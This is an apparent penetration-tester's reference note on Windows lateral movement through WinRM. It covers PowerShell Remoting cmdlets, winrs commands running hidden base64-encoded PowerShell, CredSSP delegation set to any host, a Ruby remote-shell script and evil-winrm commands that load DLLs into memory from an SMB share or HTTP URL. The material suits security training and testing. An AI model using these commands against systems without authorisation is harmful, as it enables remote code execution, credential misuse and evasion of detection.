# Windows - Lateral movement - Over WinRM

*PowerShell's WinRM remoting*

`Windows Remote Management (WinRM)` is the Microsoft implementation of
WS-Management Protocol, a standard Simple Object Access Protocol
(`SOAP`)-based, protocol that allows hardware and operating systems, from
different vendors, to interoperate. By default, `WinRM` uses the `TCP` ports
5985 and 5986 for connections, respectively over `HTTP` and `HTTPS`. For more
information about `WinRM` itself, refer to the `L7 - 5985-5986 WSMan` note.

Multiples cmdlets are incorporated into the PowerShell core to execute commands
remotely through `WinRM`, also known as `PowerShell Remoting`. Through
`PowerShell Remoting`, unitary commands can be executed or full PowerShell
sessions can be established.

Members of the Windows built-in `Administrators` and `Remote Management Users`
groups are allowed, by default, to access a remote machine through `WinRM`:

```
(Get-PSSessionConfiguration -Name Microsoft.PowerShell).Permission
  NT AUTHORITY\INTERACTIVE AccessAllowed, BUILTIN\Administrators AccessAllowed, BUILTIN\Remote Management Users AccessAllowed
```

Refer to the `[L7] 5985-5986 WSMan` note for the listing of the different
authentication mechanisms supported by `WinRM`.

`PowerShell Remoting` can be conducted through `HTTP` / `HTTPS` proxies, if
necessary. The proxy settings can be specified through the `Internet Options`
graphical utility and set as the system-wide `Microsoft Windows HTTP Services
(WinHTTP)` proxy using `netsh`.

```
Control Panel -> Internet Options -> Connections -> LAN settings
  "Use a proxy server for your LAN [...]" checked
  (Optional) "Bypass proxy server for local addresses" checked
  Advanced -> (For WinRM over HTTP, port TCP 5985) HTTP: <127.0.0.1 | HTTP_PROXY_IP> <HTTP_PROXY_PORT>
           -> (For WinRM over HTTPS, port TCP 5986) Secure: <127.0.0.1 | HTTPS_PROXY_IP> <HTTPS_PROXY_PORT>

netsh winhttp import proxy source=ie

# Lists the configured proxies.
netsh winhttp dump
  [...]
  set proxy proxy-server="http=<HTTP_PROXY_IP>:<HTTP_PROXY_PORT>;https=<HTTPS_PROXY_IP>:<HTTPS_PROXY_PORT>" bypass-list="<local>"

# Restore the WinHTTP default proxy settings (no proxies).
netsh winhttp reset proxy
```

The `Invoke-Command`, `Enter-PSSession`, and `New-PSSession` PowerShell cmdlets
can be used to execute commands on a remote host through `WinRM`:

```bash
# PowerShell built-in cmdlets.

$user = '<DOMAIN | WORKGROUP>\<USERNAME>';
$pass = '<PASSWORD>';
$spass = ConvertTo-SecureString -AsPlainText $pass -Force;
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList $user,$spass;

# Executes a PowerShell single command.
Invoke-Command -ComputerName <HOSTNAME | IP> -Credential $creds -ScriptBlock { <POWERSHELL> };

# Enters an interactive PowerShell session.
Enter-PSSession -ComputerName <HOSTNAME | IP> -Credential $creds

# Creates an interactive PowerShell session that can be used to execute further commands, transfer files, or enter an interactive session.
$s = New-PSSession [-Credential <PSCredential>] -ComputerName <HOSTNAME | IP>
Invoke-Command -Session $s -ScriptBlock { <POWERSHELL> }
Enter-PSSession -Session $s
Copy-Item -FromSession $s -Destination "<LOCAL_PATH>" "<REMOTE_FILE_PATH>"
Copy-Item -ToSession $s -Destination "<REMOTE_PATH>" "<LOCAL_FILE_PATH>"
Remove-PSSession -Session $s

# winrs utility.

# WinRM over HTTP 5985.
winrs /noprofile -r:<HOSTNAME | IP> -u:<DOMAIN | WORKGROUP>\<USERNAME> -p:<PASSWORD> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Enc <BASE64_ENCODED_POWERSHELL>

# WinRM over HTTPS 5986.
winrs /noprofile /usessl -r:<HOSTNAME | IP> -u:<DOMAIN | WORKGROUP>\<USERNAME> -p:<PASSWORD> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Enc <BASE64_ENCODED_POWERSHELL>
```

To solve the "double hop" authentication problem, which occurs whenever trying
to access resources on a third server from the first remotely connected server,
the `CredSSP` authentication mechanism can be used. Simply put, the problem
happens because credentials are not allowed for delegation and thus can't be
passed whenever accessing network resources from the remotely connected system.
All access ends up being unauthenticated and results in `Access denied` errors.

Supports for `CredSSP` must be activated and configured on the client attacking
system. The configuration below allows delegation to any system.

```
winrm quickconfig
Set-Item WSMan:localhost\client\trustedhosts -value *
Enable-WSManCredSSP -Role "Client" -DelegateComputer "*"

Start gpedit.msc
-> "Local Computer Policy" -> "Computer Configuration" -> "Administrative Templates" -> "System" -> "Credential Delegation"
-> In the "Settings" pane, "Allow Delegating Fresh Credentials with NTLM-only Server Authentication". -> "Enabled"
-> And in the "Options" area, "Show" -> "Value" = WSMAN/*
-> "Concatenate OS defaults with input above" checked
```

Once `CredSSP` is activated and correctly configured, the PowerShell cmdlets
`Invoke-Command` and `Enter-PSSession` can be used with the
`-Authentication CredSSP` option to make connections using `CredSSP`.

*WinRM remoting from Linux*

The following `ruby` script can be used to start a PowerShell session on a
distant Windows system through a `WinRM` service:

```ruby
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new(
  endpoint: 'http://<IP>:<PORT/wsman',
  transport: :ssl,
  user: '<USERNAME>',
  password: '<PASSWORD>',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end
```

Note that the script does not support `CredSSP` authentication and is thus
prone to the "double hop" authentication problem.

The `evil-winrm` `ruby` extend the code above with a number of functionality,
such as command history and completion, upload and download of files, loading
of in memory of `PowerShell` scripts, dll or `C#` binary, etc.

```
evil-winrm -u <USERNAME> -p '<PASSWORD>' -i <HOSTNAME | IP> -s <LOCAL_PATH_PS_SCRIPTS> -e <LOCAL_PATH_EXE_SCRIPTS>
```

Supported commands:

| Command | Description |
|---------|-------------|
| download <REMOTE_PATH> <LOCAL_PATH> | Download remote file. LOCAL_PATH is not required |
| upload <LOCAL_PATH> <REMOTE_PATH> | Download remote file. |
| services | List Windows services and the associated binaries paths |
| <PS_NAME.ps1> | Load the specified PowerShell script in memory. The PowerShell script must be in the path set at -s argument **when the evil-winrm shell was started.** <br /> `menu` can be used to list the loaded cmdlets. |
| Invoke-Binary <LOCAL_BINARY_PATH> | Load the specified binary, compiled from `C#`, to be executed in memory. Accepts up to 3 arguments |
| l04d3r-LoadDll | Load dll libraries in memory, equivalent to: `[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("pwn.dll"))` |

```
l04d3r-LoadDll -smb -path \\<HOSTNAME | IP>\\<SHARE>\\<DLL>
l04d3r-LoadDll -local -path <LOCAL_DLL_PATH>
l04d3r-LoadDll -http -path http://<URL>/<DLL>
```
